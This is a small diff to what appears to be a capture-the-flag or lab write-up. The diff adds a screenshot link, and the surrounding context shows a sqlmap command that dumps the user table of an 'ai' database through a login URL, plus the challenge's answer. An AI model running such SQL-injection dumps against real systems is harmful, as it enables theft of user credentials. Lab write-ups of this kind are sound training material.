@@ -149,4 +149,6 @@ from the ai database dump the Users table
 
 `sqlmap -u "http://<target-ip>/ai/includes/user_login?email=test&password=test" -D ai -T user --dump -level=5`
 
+![image](https://github.com/user-attachments/assets/ab97d5ea-0c98-4ef1-b9af-2e8e53040d85)
+
 **Answer:** 12345678
